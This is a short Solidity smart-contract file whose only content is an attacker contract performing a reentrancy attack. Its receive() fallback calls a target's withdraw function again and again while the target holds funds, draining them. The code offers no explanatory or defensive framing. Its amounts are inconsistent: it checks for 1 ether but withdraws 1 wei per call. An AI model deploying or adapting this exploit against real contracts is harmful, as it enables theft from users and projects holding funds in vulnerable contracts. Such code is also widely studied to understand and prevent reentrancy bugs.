pragma solidity 0.8.20;

interface TargetContractInf {
    function withdraw(uint256 amount) external;
}

contract AttackerContract {
    TargetContractInf targetContract;
    address payable targetContractAddress;

    constructor(address payable _targetContract) {
        targetContract = TargetContractInf(_targetContract);
        targetContractAddress = _targetContract;
    }

    receive() external payable {
        if (address(targetContract).balance >= 1 ether) {
            targetContract.withdraw(1);
        }
    }

    function startAttack() public {
        require(address(targetContract).balance >= 1, "Insufficient balance");
        targetContract.withdraw(1);
    }

}
